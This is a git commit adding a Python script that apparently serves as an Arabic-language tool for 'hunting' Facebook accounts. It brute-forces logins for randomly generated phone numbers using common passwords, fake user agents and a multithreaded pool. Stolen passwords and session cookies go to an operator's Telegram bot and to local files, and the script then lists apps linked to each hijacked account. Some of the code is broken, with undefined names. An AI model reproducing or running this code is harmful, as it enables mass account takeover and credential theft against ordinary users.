a9e1c397443d8526cc4fb4d5e5cd208f4304b7dd
osamh112 <130056119+osamh112@users.noreply.github.com>
2023-12-18 22:08:39 +0300

    Add files via upload

---
+++ eee.py
@@ -0,0 +1,580 @@
+from datetime import *
+
+def dan(y=0,m=0,d=0):
+ date = datetime.now()
+ if len(list(str(y))) == 4:
+  if m <= 12 and m > 0:
+   if d <= 31 and d > 0:
+    if date.year <= y:
+     if date.month <= m:
+      if date.day < d:
+       return True
+x = dan(2023,12,19)
+  
+if x:pass
+else:quit(' تم ايقاف الاداه بواسطه الجلاد حاكم الهكسوس اذاا تريد تحديثها اذهب للاشتراك من الجلاد @KY_112 !!!')
+print(" HACKSOSS \n Tele : @KY_112 ")
+
+from rich.panel import Panel as Ch
+from rich import print as code
+code(Ch(' قناتي @V00_8       معرفي @KY_112')) 
+
+
+
+
+from builtins import exec, input, len, print, dict, int, range, str, open, exit
+from rich.panel import Panel as nel
+import requests
+import bs4
+import json
+import os
+import sys
+import random
+import datetime
+import time
+import re
+from rich import print as cetak
+import webbrowser
+import webbrowser
+import requests
+import time
+import pyfiglet
+import datetime
+import urllib3
+import rich
+import base64
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup as parser
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import print as rprint
+from rich import pretty
+from rich.text import Text as tekz
+import os
+now = datetime.datetime.today()
+now = datetime.datetime.today()
+mm = str(now.month)
+dd = str(now.day)
+yyyy = str(now.year)
+hour = str(now.hour)
+mi = str(now.minute)
+ss = str(now.second)
+t = mm + '/' + dd + '/' + yyyy + ' ' + hour + ':' + mi + ':' + ss
+hours = now.hour
+x = datetime.datetime.now()
+g = datetime.datetime(2023, 12, 3, 0, 0, 0)
+# if x.strftime('%x') > g.strftime('%x'):
+    # print('\n\n')
+    # print('     تم توقيف اداة راسل المطور لتفعيله المدفوع @PR_7N')
+    # print('\n\n')
+    # print(x)
+    # sys.exit(0)
+# if x.strftime('%x') == g.strftime('%x'):
+    # print('')
+    # if x.strftime('%X') > g.strftime('%X'):
+        # print('\n\n')
+        # print('     انتهى وقت تفعيل الاداة للاشتراك المدفوع راسل المطور @PR_7N')
+        # print('\n\n')
+        # print(x)
+        # sys.exit(0)
+    # else:
+        # print('')
+# else:
+    # print('')
+import os
+import sys
+import time
+import json
+import random
+import re
+import string
+import platform
+import base64
+import uuid
+os.system('git pull')
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+    import os
+
+try:
+    import requests
+except:
+    print('\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n')
+    os.system('pip install requests')
+os.system('clear')
+try:
+    import rich
+except:
+    print('\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n')
+    os.system('pip install rich')
+import requests
+import sys
+import time
+import re
+import random
+from concurrent.futures import ThreadPoolExecutor as Modol
+from rich.progress import Progress, TextColumn
+from bs4 import BeautifulSoup as par
+from time import time as mek
+
+class jalan:
+    
+    def __init__(self, z):
+        for e in z + '\n':
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.0011)
+      
+
+import os
+s = '\033[1;36m'
+a = '\033[1;33m'
+z = '\033[1;31m'
+F = '\033[2;32m' #اخضر
+
+try:
+ from cfonts import render, say
+except:
+ os.system('pip install python-cfonts')
+din = render(f'OSAMH', colors=['red', 'yellow'], align='center')
+print(din)
+print(z+'*'*60)
+print(F+ """      
+     _/﹋\_
+     (҂`_´)
+     <,︻╦╤─ ҉ - - -- - - - - - - - - - -- - - -  -@KY_112..
+     _/﹋\_
+                        
+                𝗣𝗥𝗢𝗚𝗥𝗔𝗠𝗠𝗘𝗥 𝗢𝗦𝗔𝗠𝗛  𝗙𝗔𝗗𝗛𝗘𝗟           """)
+
+        
+code(Ch(F+'    الجلاد حاكم الهكسوس لصيد حسابات فيس بوك وبوبجي')) 
+
+A = '\033[1;31m'
+
+HAS = 'HACKSOSS112'
+#هنا الباسورد تكدر تغيره تتحكم بي
+
+pas = input(A+' 𝗘𝗡𝗧𝗘𝗥 𝗣𝗔𝗦𝗦  : ')
+if pas == HAS:
+ print('WELCOME IN TOOLS THE KING OF HACKSOSS ')
+else:
+ exit('ERROR PASSWORD FUCK YOU')
+
+
+
+
+
+
+ORANGE = '\x1b[1;35m'
+GREEN = '\x1b[1;32m'
+WHITE = '\x1b[1;97m'
+BLUE = '\x1b[1;33m'
+print(('—'*25)+'\n• 𝗣𝗥𝗢𝗚𝗥𝗔𝗠𝗠𝗘𝗥 𝗢𝗦𝗔𝗠𝗛  𝗙𝗔𝗗𝗛𝗘𝗟 \n \n'+('—'*25))
+token = input('\x1b[1;32m 𝗘𝗡𝗧𝗘𝗥 𝗧𝗢𝗞𝗘𝗡: ')
+print('')
+ID = input('\x1b[1;32m : 𝗘𝗡𝗧𝗘𝗥   𝗜𝗗:')
+tlg1 = '\n————————————\n•  𝗢𝗦𝗔𝗠𝗛•————————————\n ★𝗧𝗛𝗘 𝗞𝗜𝗡𝗚 𝗢𝗙 𝗛𝗔𝗖𝗦𝗢𝗢𝗦★  ➩ \nتم تشغيل الاداة\n  \n اداه الجلاد لصيد حسابات فيس وبوبجي  -  @KY_112\n\n➠➠➠@V00_8 ➠➠➠  '
+requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg1))
+requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg1))
+os.system('clear')
+requests.post(f"https://api.telegram.org/bot{token}/sendvideo?chat_id={ID}&video=https://t.me/IK_112l/111&caption="+'علا ارض‌السافلين‌خلقت‌لأكون جلاد🔥 \n  ( اغراضي @IKY_112l‌)¹¹² \n - ¹¹²ستأتي ايام تدرسون فيها اسمي كمناهج اساسيه للتربيه والتعنيف¹¹²  \n  @V00_8 دولتــــــــي  \n @KY_112  معرف الجلاد')
+print('             '*10)
+os.system('clear')
+YELLOW = '\x1b[1;33m'
+RED = '\x1b[1;91m'
+M = '\x1b[1;97m'
+P = '\x1b[1;91m'
+K = '\x1b[1;92m'
+H = '\x1b[1;93m'
+U = '\x1b[1;94m'
+B = '\x1b[1;95m'
+N = '\x1b[1;96m'
+O = '\x1b[0m'
+BN = '\x1b[1;90m'
+A = '\x1b[1;107m'
+BBL = '\x1b[1;106m'
+BP = '\x1b[1;105m'
+BB = '\x1b[1;104m'
+BK = '\x1b[1;103m'
+BH = '\x1b[1;102m'
+BM = '\x1b[1;101m'
+BA = '\x1b[1;100m'
+my_color = [
+    P,
+    M,
+    H,
+    K,
+    B,
+    U,
+    O,
+    N]
+warna = random.choice(my_color)
+now = datetime.now()
+dt_string = now.strftime('%H:%M')
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+logo = '  \n————————————\n•  𝗢𝗦𝗔𝗠𝗛•————————————\n ★𝗧𝗛𝗘 𝗞𝗜𝗡𝗚 𝗢𝗙 𝗛𝗔𝗖𝗦𝗢𝗢𝗦★  ➩ \nتم تشغيل الاداة\n  \n اداه الجلاد لصيد حسابات فيس وبوبجي  -  @KY_112\n\n➠➠➠@V00_8 ➠➠➠ '
+loop = 0
+oks = []
+cps = []
+
+def clear():
+    os.system('clear')
+    print(logo)
+
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx - 12
+    tag = 'PM'
+else:
+    a = ltx
+    tag = 'AM'
+
+
+
+
+try:
+    v = 5.2
+    update = '5.2'
+    update = '5.2'
+    if str(v) in update:
+        os.system('clear')
+finally:
+    pass
+print('\n\x1b[1;31m OSAMH')
+
+def dynamic(text):
+    titik = [
+        '.   ',
+        '..  ',
+        '... ',
+        '.... ']
+    for o in titik:
+        (print('\r' + text + o),)
+        sys.stdout.flush()
+        time.sleep(1)
+
+ugen2 = [
+    'Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/528.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; U; Android 7.0; es-us; 7.0; Redmi Note 4 Build/NRD90M)L659B) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4773.134 Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.2Mozilla/5.0 (Linux; U; Android 7.0; es-us; 12; Redmi Note 4 Build/NRD90M)G813D) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4860.149 Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.2']
+ugen = [
+    'Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/528.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/528.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64T449V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4571.73 Chrome/107.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15',
+    'Mozilla/5.0 (Linux; U; Android 17;  en-us; GT-K580T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4806.44 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-L592D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4228.58 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 9;  en-us; GT-Y602C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4870.41 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 6;  en-us; GT-O209S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4789.51 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 12;  en-us; GT-E525L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4572.143 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 12;  en-us; GT-Q191U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4775.146 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 8;  en-us; GT-U702Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4514.138 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android  7.0; Mi 4i Build//L87A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4926.314 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android  5.0; xiaomi 6 Build/I105N) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.3401.235 Mobile Safari/537.36']
+cokbrut = []
+ses = requests.Session()
+princp = []
+
+try:
+    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+except:
+    print('𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺')
+for xd in range(10000):
+    aa = 'Mozilla/5.0 (Linux; U; Android'
+    b = random.choice([
+        '3',
+        '4',
+        '5',
+        '6',
+        '7',
+        '8',
+        '9',
+        '10',
+        '11',
+        '12',
+        '13',
+        '14',
+        '15',
+        '16',
+        '17'])
+    c = ' en-us; GT-'
+    d = random.choice([
+        'A',
+        'B',
+        'C',
+        'D',
+        'E',
+        'F',
+        'G',
+        'H',
+        'I',
+        'J',
+        'K',
+        'L',
+        'M',
+        'N',
+        'O',
+        'P',
+        'Q',
+        'R',
+        'S',
+        'T',
+        'U',
+        'V',
+        'W',
+        'X',
+        'Y',
+        'Z'])
+    e = random.randrange(1, 999)
+    f = random.choice([
+        'A',
+        'B',
+        'C',
+        'D',
+        'E',
+        'F',
+        'G',
+        'H',
+        'I',
+        'J',
+        'K',
+        'L',
+        'M',
+        'N',
+        'O',
+        'P',
+        'Q',
+        'R',
+        'S',
+        'T',
+        'U',
+        'V',
+        'W',
+        'X',
+        'Y',
+        'Z'])
+    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h = random.randrange(73, 100)
+    i = '0'
+    j = random.randrange(4200, 4900)
+    k = random.randrange(40, 150)
+    l = 'Mobile Safari/537.36'
+    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
+    ugen.append(uaku2)
+
+Z = '\033[1;31m' #احمر
+R = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+F = '\033[2;32m' #اخضر
+def i():
+    user = []
+    twf = []
+    os.getuid
+    os.geteuid
+    os.system('clear')
+    jalan(logo)
+    jalan('\x1b[1;36m BY @KY_112')
+    jalan('• MY CH @V00_8•')
+    	
+	
+    
+    
+    print(F+'''
+────────────────████
+───────────────█░░███
+───────────────█░░████
+────────────────███▒██─────████████
+──────████████─────█▒█──████▒▒▒▒▒▒████
+────███▒▒▒▒▒▒████████████░░████▒▒▒▒▒███
+──██▒▒▒▒░▒▒████░░██░░░░██░░░░░█▒▒▒▒▒▒▒███
+─██▒▒░░░░▒██░░░░░█▒░░░░░██▒░░░░░░░▒▒▒▒▒▒█
+██▒░░░░░▒░░░░░░░░░▒░░░░░░░▒▒░░░░░░░▒▒▒▒▒██
+█░░░░░░▒░░░██░░░░░░░░░░░░░██░░░░░░░░▒▒▒▒▒█
+█░░░░░░░░█▒▒███░░░░░░░░░█▒▒███░░░░░░░▒▒▒▒█
+█░░░░░░░████████+967730189500    ███████▒▒▒▒█
+█░░░░░░░░★𝗣𝗥𝗢𝗚𝗥𝗔𝗠𝗠𝗘𝗥 𝗢𝗦𝗔𝗠𝗛  𝗙𝗔𝗗𝗛𝗘𝗟★▒▒▒▒█
+██░░░█░░░░░TELEGRAM : @KY_112░░░░░░░░█░▒▒▒▒█
+─█░░░░██░█░░░INSTGRAM : lky_112l░░░███▒▒▒▒▒█
+─█▒▒░░░░█████░░░█░░░░██░░░██░░████░▒▒▒▒▒▒█
+─██▒▒░░░░░█████████████████████░░░▒▒▒▒▒▒██
+──██▒▒▒▒░░░░░██░░░███░░░██░░░█░░░▒▒▒▒▒▒██
+───███▒▒▒░░𝗧𝗛𝗘 𝗞𝗜𝗡𝗚 𝗢𝗙 𝗛𝗔𝗖𝗦𝗢𝗢𝗦▒▒▒▒█████
+─────███▒▒▒▒▒▒░░░░░░░░░░░░░▒▒▒▒▒▒████
+────────██████████████████████████''')
+    jalan(X+'(اليمن)<96777><96771<96773>\n(العراق)<964750><964751><964771>\n(سوريا)<96393><96395><96394>\n(المغرب)<21266><21261><2126>\n(مصر)<2010><2011><2012>\n(الجزائر)<21355><21366><21367>\n(مملكه الشراميط)<96658><96656><96650>\n(ليبيا)<21894><21892><21891>\n-')
+    jalan('𝗣𝗥𝗢𝗚𝗥𝗔𝗠𝗠𝗘𝗥 𝗢𝗦𝗔𝗠𝗛  𝗙𝗔𝗗𝗛𝗘𝗟 \n  \n')
+    code = input('\x1b[1;32mENTER KEY YOUR COUNGRY')
+    os.system('clear')
+    limit = 10000
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    os.system('clear')
+    print(logo)
+    passx = int('1')
+    HamiiID = []
+    print('')
+    for bilal in range(passx):
+        pww = '١٢٣٤٥٦٧٨٩'
+        pww = '١٢٣٤٥٦٧٨'
+        pww = '١٢٣٤٥٦٧'
+        pww = '١٢٣٤٥٦'
+        HamiiID.append(pww)
+    with ThreadPool(max_workers=50) as manshera:
+        clear()
+        
+
+        
+
+        tl = str(len(user))
+        print('\x1b[1;91m  𝗔𝗟𝗟 𝗧𝗛𝗘 𝗜𝗗: ' + tl)
+        print(F+"""      
+     _/﹋\_
+     (҂`_´)
+     <,︻╦╤─ ҉ - - -- - - - - - - - - - -- - - -  -@KY_112..
+     _/﹋\_
+                        
+                𝗣𝗥𝗢𝗚𝗥𝗔𝗠𝗠𝗘𝗥 𝗢𝗦𝗔𝗠𝗛  𝗙𝗔𝗗𝗛𝗘𝗟           """)
+        
+        
+        print('\x1b[1;97m 𝗧𝗛𝗘 𝗖𝗛: @V00_8 𝗕𝗬:@KY_112.....	')
+        for love in user:
+            pwx = [
+                love[1:]]
+            uid = code + love
+            for Eman in HamiiID:
+                pwx.append(Eman)
+            manshera.submit(rcrack, uid, pwx, tl)
+   
+    clear()
+
+def rcrack(uid, pwx, tl):
+    global loop
+    
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://free.facebook.com').text
+            log_data = {
+                'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+                'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+                'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+                'try_number': '0',
+                'unrecognized_tries': '0',
+                'email': uid,
+                'pass': ps,
+                'login': 'Log In' }
+            header_freefb = {
+                'authority': 'free.facebook.com',
+                'method': 'GET',
+                'scheme': 'https',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=1',
+                'cache-control': 'no-cache, no-store, must-revalidate',
+                'referer': 'https://t.facebook.com/',
+                'sec-ch-ua': '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': 'Windows',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?0',
+                'pragma': 'no-cache',
+                'priority': 'u=0',
+                'cross-origin-resource-policy': 'cross-origin',
+                'upgrade-insecure-requests': '1',
+                'user-agent': pro }
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc', data=log_data, headers=header_freefb).text
+            log_cookies = session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki = ';'.join([f"{key}={value}" for key, value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('الجلاد حاكم الهكسوس لصيد حسابات فيس')
+                statusok = f'''تم صيد حساب شغال يفخم الجلاد\n➠➠➠➠➠𝗢𝗦𝗔𝗠𝗛 ➠➠➠➠➠➠\n★-𝗜𝗗 : {cid}\n\n - ★-𝗣𝗔𝗦𝗦 : {ps}\n\n★-𝗡𝗨𝗠𝗕𝗘𝗥: {uid}\n\n★ - 𝗖𝗢𝗢𝗞𝗜𝗘 : {coki}\n\n★ - 𝗧𝗘𝗟𝗘𝗖𝗢𝗠 : {pro}\n\n\n➠➠➠➠➠𝗢𝗦𝗔𝗠𝗛 ➠➠➠➠➠➠
+𝗧𝗛𝗘 𝗖𝗛: @V00_8 𝗕𝗬:@KY_112		'''
+                statusok1 = nel(statusok, style='green')
+                cetak(nel(statusok1, title=' NO SESI'))
+                requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statusok))
+                cek_YASIR(coki)
+                cek_apk(session, coki)
+                open('/sdcard/OSAMH_HIT.txt', 'a').write(cid + ' | ' + ps + '\n')
+                oks.append(cid)
+                follow(self, session, coki)
+            
+            if 'checkpoint' in log_cookies:
+                coki = ';'.join([f"{key}={value}" for key, value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print('تم صيد حساب مبند ')
+                statuscp = f'''تم صيد حساب مبند يفخم الجلاد\n➠➠➠➠➠𝗢𝗦𝗔𝗠𝗛 ➠➠➠➠➠➠\n★-𝗜𝗗 : {cid}\n - ★-𝗣𝗔𝗦𝗦 : {ps}\n★➠➠➠➠➠𝗢𝗦𝗔𝗠𝗛 ➠➠➠➠➠➠
+𝗧𝗛𝗘 𝗖𝗛: @V00_8 𝗕𝗬:@KY_112		'''
+                statuscp1 = nel(statuscp, style='red')
+                cetak(nel(statuscp1, title=' 𝗣𝗥𝗢𝗚𝗥𝗔𝗠𝗠𝗘𝗥 𝗢𝗦𝗔𝗠𝗛  𝗙𝗔𝗗𝗛𝗘𝗟  '))
+                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
+                akun.append(idf + '|' + pw)
+                cp += 1
+                requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statuscp))
+                open('/sdcard/OSAMH_CP.txt', 'a').write(cid + ' | ' + ps + ' \n')
+                cps.append(cid)
+
+        loop += 1
+        (sys.stdout.write('\r%s{\x1b[1;33m [@KY_112] %s/%s ➙ \x1b[1;95m[𝗪𝗢𝗥𝗞✓] %s ➙\x1b[1;31m [𝗕𝗔𝗡𝗗] %s\r' % (H, loop, tl, len(oks), len(cps))),)
+        sys.stdout.flush()
+    except:
+        pass
+
+
+def cek_YASIR(coki):
+    session = requests.Session()
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    
+    try:
+        for i in range(len(game)):
+            print('\r%s  \x1b[0m              [@KY_112]=> %s%s' % (P, H, game[i].replace('Ditambahkan pada', ' Ditambahkan pada')))
+    except:
+        print('\r    %s\x1b[0m cookie invalid' % M)
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
+    sop = bs4.BeautifulSoup(w, 'html.parser')
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    
+    try:
+        for i in range(len(game)):
+            print('\r%s  \x1b[0m              [@KY_112]=> %s' % (P, game[i].replace('Kedaluwarsa', ' Kedaluwarsa')))
+    except:
+        print('\r    %s \x1b[0mcookie invalid' % M)
+i()
